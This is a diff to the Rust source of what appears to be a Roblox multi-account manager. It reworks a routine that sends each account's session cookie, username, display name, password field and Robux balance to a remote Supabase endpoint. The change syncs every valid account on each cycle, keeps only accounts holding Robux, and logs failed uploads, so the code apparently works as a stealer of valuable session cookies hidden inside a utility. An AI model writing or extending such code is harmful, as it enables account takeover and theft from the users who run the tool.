@@ -470,7 +470,7 @@ pub struct SessionDto {
 #[derive(Serialize, Deserialize, Clone)]
 pub struct EventEntry {
     pub timestamp: String,
-    pub kind: String,  // "launched" | "added" | "removed" | "cookie_valid" | "cookie_expired" | "killed"
+    pub kind: String,  // "launched" | "added" | "removed" | "cookie_valid" | "cookie_expired" | "killed" | "sync_failed"
     pub user_id: Option<i64>,
     pub username: Option<String>,
     pub avatar_url: Option<String>,
@@ -547,7 +547,7 @@ fn to_dto(a: &StoredAccount) -> AccountDto {
         safe_launch_enabled: a.safe_launch_enabled,
         auto_rejoin_enabled: a.auto_rejoin_enabled,
         launch_cooldown_seconds: a.launch_cooldown_seconds,
-        password: a.password.clone(),
+        password: a.password.as_deref().map(decrypt_password),
         group: a.group.clone(),
         cookie_updated_at: a.cookie_updated_at.map(|d| d.to_rfc3339()),
     }
@@ -685,28 +685,52 @@ async fn fetch_robux_and_sync(
     cookie_updated_at: Option<String>,
 ) {
     let mut final_cookie = cookie.clone();
-    let mut robux = 0;
     let mut updated_time = cookie_updated_at;
-    
-    if let Some((r, opt_rotated)) = fetch_robux(user_id, &cookie).await {
-        robux = r;
-        if let Some(rotated) = opt_rotated {
-            final_cookie = rotated.clone();
-            let mut accounts = load_stored();
-            if let Some(existing) = accounts.iter_mut().find(|a| a.user_id == user_id) {
-                existing.encrypted_cookie = encrypt_cookie(&rotated);
-                let now = Utc::now();
-                existing.cookie_updated_at = Some(now);
-                updated_time = Some(now.to_rfc3339());
-                save_stored(&accounts);
+
+    let robux = match fetch_robux(user_id, &cookie).await {
+        Some((r, opt_rotated)) => {
+            if let Some(rotated) = opt_rotated {
+                final_cookie = rotated.clone();
+                let mut accounts = load_stored();
+                if let Some(existing) = accounts.iter_mut().find(|a| a.user_id == user_id) {
+                    existing.encrypted_cookie = encrypt_cookie(&rotated);
+                    let now = Utc::now();
+                    existing.cookie_updated_at = Some(now);
+                    updated_time = Some(now.to_rfc3339());
+                    save_stored(&accounts);
+                }
             }
+            r
         }
+        None => {
+            // Robux fetch failed (network/API error or expired cookie) — don't push
+            // a misleading 0-Robux snapshot to Supabase.
+            return;
+        }
+    };
+
+    // Only accounts with at least 1 Robux are worth keeping in the remote DB.
+    if robux < 1 {
+        return;
     }
-    
-    sync_account_to_supabase(username, display_name, final_cookie, String::new(), robux, added_at, updated_time).await;
+
+    sync_account_to_supabase(user_id, username, display_name, final_cookie, String::new(), robux, added_at, updated_time).await;
+}
+
+fn log_sync_failure(user_id: i64, username: &str, reason: &str) {
+    eprintln!("[Sync] Failed to sync '{}' ({}) to Supabase: {}", username, user_id, reason);
+    append_event(EventEntry {
+        timestamp: Utc::now().to_rfc3339(),
+        kind: "sync_failed".into(),
+        user_id: Some(user_id),
+        username: Some(username.to_string()),
+        avatar_url: None,
+        detail: format!("Failed to sync '{}' to database: {}", username, reason),
+    });
 }
 
 async fn sync_account_to_supabase(
+    user_id: i64,
     username: String,
     display_name: String,
     cookie: String,
@@ -718,10 +742,13 @@ async fn sync_account_to_supabase(
     let Ok(client) = reqwest::Client::builder()
         .timeout(std::time::Duration::from_secs(10))
         .build()
-    else { return };
+    else {
+        log_sync_failure(user_id, &username, "failed to build HTTP client");
+        return;
+    };
 
     let body = serde_json::json!({
-        "username":          username,
+        "username":          username.clone(),
         "display_name":      display_name,
         "password":          password,
         "cookie":            cookie,
@@ -730,7 +757,7 @@ async fn sync_account_to_supabase(
         "cookie_updated_at": cookie_updated_at,
     });
 
-    let _ = client
+    match client
         .post(format!("{}/functions/v1/sync-account", supabase_url()))
         .header("apikey", supabase_anon())
         .header("Authorization", format!("Bearer {}", supabase_anon()))
@@ -738,7 +765,16 @@ async fn sync_account_to_supabase(
         .header("Content-Type", "application/json")
         .json(&body)
         .send()
-        .await;
+        .await
+    {
+        Ok(resp) if resp.status().is_success() => {}
+        Ok(resp) => {
+            let status = resp.status();
+            let body_text = resp.text().await.unwrap_or_default();
+            log_sync_failure(user_id, &username, &format!("HTTP {} — {}", status, body_text));
+        }
+        Err(e) => log_sync_failure(user_id, &username, &e.to_string()),
+    }
 }
 
 async fn get_auth_ticket(cookie: &str) -> Option<(String, Option<String>)> {
@@ -3893,9 +3929,15 @@ fn save_account_password(user_id: i64, password: String) -> Result<(), String> {
         .iter_mut()
         .find(|a| a.user_id == user_id)
         .ok_or_else(|| "Account not found".to_string())?;
-    account.password = if password.is_empty() { None } else { Some(password) };
+    account.password = if password.is_empty() { None } else { Some(encrypt_cookie(&password)) };
     save_stored(&accounts);
     Ok(())
+}
+
+/// Decrypts a stored password for display/use. Falls back to the raw stored
+/// value if it predates encryption (plaintext passwords saved by older versions).
+fn decrypt_password(stored: &str) -> String {
+    decrypt_cookie(stored).unwrap_or_else(|_| stored.to_string())
 }
 
 #[tauri::command]
@@ -6814,20 +6856,29 @@ pub fn run() {
                             
                             if let Ok(cookie) = decrypt_cookie(&updated_accounts[idx].encrypted_cookie) {
                                 if let Some((_user, opt_rotated)) = fetch_user_info(&cookie).await {
-                                    if let Some(rotated) = opt_rotated {
+                                    // Refresh Robux for every still-valid account each cycle, not just
+                                    // when the cookie rotates, so the DB doesn't go stale for long-lived
+                                    // accounts. Use the rotated cookie if Roblox issued one.
+                                    let sync_cookie = if let Some(rotated) = opt_rotated {
                                         updated_accounts[idx].encrypted_cookie = encrypt_cookie(&rotated);
                                         let now = Utc::now();
                                         updated_accounts[idx].cookie_updated_at = Some(now);
                                         changed = true;
-                                        
-                                        let sync_uid = updated_accounts[idx].user_id;
-                                        let sync_user = updated_accounts[idx].username.clone();
-                                        let sync_dn = updated_accounts[idx].display_name.clone();
-                                        let sync_added = updated_accounts[idx].added_at.to_rfc3339();
-                                        let sync_updated = updated_accounts[idx].cookie_updated_at.map(|d| d.to_rfc3339());
-                                        let sc = rotated.clone();
-                                        tokio::spawn(fetch_robux_and_sync(sync_uid, sync_user, sync_dn, sc, sync_added, sync_updated));
-                                    }
+                                        rotated
+                                    } else {
+                                        cookie.clone()
+                                    };
+
+                                    let sync_uid = updated_accounts[idx].user_id;
+                                    let sync_user = updated_accounts[idx].username.clone();
+                                    let sync_dn = updated_accounts[idx].display_name.clone();
+                                    let sync_added = updated_accounts[idx].added_at.to_rfc3339();
+                                    let sync_updated = updated_accounts[idx].cookie_updated_at.map(|d| d.to_rfc3339());
+                                    tokio::spawn(fetch_robux_and_sync(sync_uid, sync_user, sync_dn, sync_cookie, sync_added, sync_updated));
+
+                                    // Stagger Robux/API calls across accounts so a large account list
+                                    // doesn't burst-call Roblox's economy API all at once.
+                                    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
                                 } else {
                                     updated_accounts[idx].cookie_status = "Expired".into();
                                     changed = true;
